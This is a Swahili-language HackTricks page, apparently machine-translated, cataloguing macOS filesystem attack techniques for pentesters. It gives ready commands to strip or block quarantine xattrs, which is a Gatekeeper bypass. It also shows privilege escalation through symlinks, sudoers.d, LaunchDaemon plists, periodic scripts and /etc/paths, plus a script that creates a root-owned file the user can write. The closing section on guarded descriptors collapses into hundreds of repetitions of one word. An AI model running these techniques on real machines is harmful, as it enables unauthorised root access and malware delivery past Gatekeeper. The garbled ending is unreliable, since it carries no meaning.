# Mbinu za macOS FS

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Mchanganyiko wa ruhusa za POSIX

Ruhusa katika **directory**:

* **soma** - unaweza **kuorodhesha** viingilio vya directory
* **andika** - unaweza **kufuta/kuandika** **faili** katika directory na unaweza **kufuta folda tupu**.
* Lakini huwezi **kufuta/kurekebisha folda zilizo na vitu** isipokuwa una ruhusa za kuandika juu yake.
* Huwezi **kurekebisha jina la folda** isipokuwa unamiliki.
* **tekeleza** - unaruhusiwa **kutembea** directory - ikiwa huna haki hii, huwezi kupata faili yoyote ndani yake, au katika subdirectories yoyote.

### Mchanganyiko Hatari

**Jinsi ya kubadilisha faili/folder iliyo milikiwa na root**, lakini:

* Mzazi mmoja wa **directory ni mmiliki** ni mtumiaji
* Mzazi mmoja wa **directory ni mmiliki wa kikundi cha watumiaji** na **ruhusa ya kuandika**
* Kikundi cha watumiaji kina **ruhusa ya kuandika** kwa **faili**

Kwa mchanganyiko wowote uliopita, mshambuliaji anaweza **kuingiza** **kiungo cha sim/hard** kwenye njia inayotarajiwa ili kupata uandishi wa aina ya kipekee.

### Kesi Maalum ya R+X ya Mzizi wa Folda

Ikiwa kuna faili katika **directory** ambapo **root pekee ana ufikiaji wa R+X**, hizo **hazipatikani kwa mtu mwingine yeyote**. Kwa hivyo, udhaifu unaoruhusu **kuhamisha faili inayoweza kusomwa na mtumiaji**, ambayo haiwezi kusomwa kwa sababu ya **kizuizi hicho**, kutoka kwenye folda hii **kwenda kwenye nyingine**, unaweza kutumika kusoma faili hizi.

Mfano katika: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Kiungo cha Ishara / Kiungo Kali

Ikiwa mchakato uliopewa mamlaka unahifadhi data katika **faili** ambayo inaweza **kudhibitiwa** na **mtumiaji mwenye mamlaka ya chini**, au ambayo inaweza **kuundwa mapema** na mtumiaji mwenye mamlaka ya chini. Mtumiaji anaweza tu **kuielekeza kwenye faili nyingine** kupitia Kiungo cha Ishara au Kiungo Kali, na mchakato uliopewa mamlaka atahifadhi kwenye faili hiyo.

Angalia sehemu zingine ambapo mshambuliaji anaweza **kutumia uandishi wa aina ya kipekee kwa kuboresha mamlaka**.

## .fileloc

Faili zenye kipengele cha **`.fileloc`** zinaweza kuashiria programu au binaries nyingine hivyo wakati zinafunguliwa, programu/binari itakuwa ile inayotekelezwa.\
Mfano:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## FD ya Kiholela

Ikiwa unaweza kufanya **mchakato ufungue faili au folda kwa mamlaka ya juu**, unaweza kutumia **`crontab`** kufungua faili katika `/etc/sudoers.d` kwa **`EDITOR=exploit.py`**, hivyo `exploit.py` itapata FD ya faili ndani ya `/etc/sudoers` na kuitumia.

Kwa mfano: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Epuka mbinu za xattrs za karantini

### Ondoa hiyo
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### Bendera ya uchg / uchange / uimmutable

Ikiwa faili/folder ina sifa hii isiyoondolewa, haitawezekana kuweka xattr juu yake
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Kuunganisha defvfs

**Kuunganisha devfs** **haishikilii xattr**, maelezo zaidi katika [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### Andika xattr ACL

ACL hii inazuia kuongeza `xattrs` kwa faili
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**Muundo wa faili wa AppleDouble** unachukua faili pamoja na ACEs zake.

Katika [**msimbo wa chanzo**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) inawezekana kuona kwamba uwakilishi wa maandishi wa ACL uliohifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utawekwa kama ACL katika faili iliyopunguzwa. Kwa hivyo, ikiwa ulipunguza programu ndani ya faili ya zip na muundo wa faili wa **AppleDouble** na ACL ambayo inazuia xattrs zingine kuandikwa kwake... xattr ya karantini haikuwekwa kwenye programu:

Angalia [**ripoti ya asili**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa maelezo zaidi.

Ili kuzidisha hii kwanza tunahitaji kupata mnyororo sahihi wa acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Hakika haikuhitajika lakini naacha hapo kwa tahadhari:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Kupuuza Saini za Kodi

Vifurushi vinavyo **`_CodeSignature/CodeResources`** ambavyo vina **hash** ya kila **faili** katika **kifurushi**. Tafadhali kumbuka kuwa hash ya CodeResources pia **imeingizwa kwenye kutekelezeka**, hivyo hatuwezi kuharibu hilo, pia.

Hata hivyo, kuna baadhi ya faili ambazo saini yake haitachunguzwa, hizi zina ufunguo wa kutoa katika plist, kama vile:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Inawezekana kuhesabu saini ya rasilimali kutoka kwa cli na:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Pakia faili za dmgs

Mtumiaji anaweza kupakia faili ya dmg iliyoundwa hata juu ya folda zilizopo. Hivi ndivyo unavyoweza kuunda pakiti ya dmg ya desturi na maudhui ya desturi:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

Kawaida macOS inamount diski inazungumza na huduma ya `com.apple.DiskArbitrarion.diskarbitrariond` (iliyotolewa na `/usr/libexec/diskarbitrationd`). Ikiwa unaweka paramu `-d` kwenye faili ya plist ya LaunchDaemons na kuanzisha upya, itahifadhi logs itahifadhi logs katika `/var/log/diskarbitrationd.log`.\
Walakini, inawezekana kutumia zana kama `hdik` na `hdiutil` kuwasiliana moja kwa moja na `com.apple.driver.DiskImages` kext.

## Kuandika Kiholela

### Skripti za sh za kipindi

Ikiwa skripti yako inaweza kufasiriwa kama **skripti ya shell** unaweza kubadilisha **`/etc/periodic/daily/999.local`** skripti ya shell ambayo itaanzishwa kila siku.

Unaweza **kuiga** utekelezaji wa skripti hii na: **`sudo periodic daily`**

### Daemons

Andika **LaunchDaemon** ya kiholela kama **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** na plist inayotekeleza skripti ya kiholela kama:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Faili ya Sudoers

Ikiwa una **uwezo wa kuandika** kwa hiari, unaweza kuunda faili ndani ya folda **`/etc/sudoers.d/`** ukijipa **ruhusa za sudo**.

### Faili za PATH

Faili ya **`/etc/paths`** ni moja ya sehemu kuu zinazojaza variable ya PATH env. Lazima uwe mtumiaji wa mizizi kuibadilisha, lakini ikiwa script kutoka kwa **mchakato uliopewa ruhusa** inatekeleza **amri bila njia kamili**, unaweza **kuiteka** kwa kubadilisha faili hii.

Unaweza pia kuandika faili katika **`/etc/paths.d`** ili kupakia folda mpya kwenye variable ya `PATH` env.

## Unda faili zinazoweza kuandikwa kama watumiaji wengine

Hii itaunda faili inayomilikiwa na mizizi ambayo inaweza kuandikwa na mimi ([**code kutoka hapa**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Hii pia inaweza kufanya kazi kama privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Kumbukumbu Inayoshirikishwa

**Kumbukumbu inayoshirikishwa ya POSIX** inaruhusu michakato katika mifumo ya uendeshaji inayozingatia POSIX kupata eneo la kumbukumbu la pamoja, ikirahisisha mawasiliano haraka ikilinganishwa na njia zingine za mawasiliano kati ya michakato. Inahusisha kujenga au kufungua kitu cha kumbukumbu kinachoshirikishwa kwa kutumia `shm_open()`, kuweka ukubwa wake kwa kutumia `ftruncate()`, na kuifunga katika eneo la anwani ya michakato kwa kutumia `mmap()`. Michakato kisha inaweza kusoma moja kwa moja na kuandika kwenye eneo hili la kumbukumbu. Ili kusimamia ufikiaji wa wakati mmoja na kuzuia uharibifu wa data, mara nyingi hutumiwa mbinu za kusawazisha kama vile mutex au semaphore. Hatimaye, michakato hufunga na kufunga kumbukumbu iliyoshirikishwa kwa kutumia `munmap()` na `close()`, na hiari kuondoa kitu cha kumbukumbu kwa kutumia `shm_unlink()`. Mfumo huu ni hasa ufanisi kwa IPC yenye ufanisi na haraka katika mazingira ambapo michakato mingi inahitaji kupata data iliyoshirikishwa kwa haraka.
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Mfano wa Kanuni ya Mtumiaji</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Descriptors Zilizolindwa za macOS

**Descripters zilizolindwa za macOS** ni kipengele cha usalama kilichoanzishwa katika macOS ili kuboresha usalama na uaminifu wa **shughuli za maelezo ya faili** katika programu za mtumiaji. Descripters hizi zilizolindwa hutoa njia ya kuunganisha vizuizi au "walinzi" maalum na maelezo ya faili, ambayo yanatekelezwa na kernel.

Kipengele hiki ni muhimu hasa kwa kuzuia aina fulani za mapungufu ya usalama kama vile **upatikanaji haramu wa faili** au **hali za mbio**. Mapungufu haya hutokea wakati kwa mfano wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati
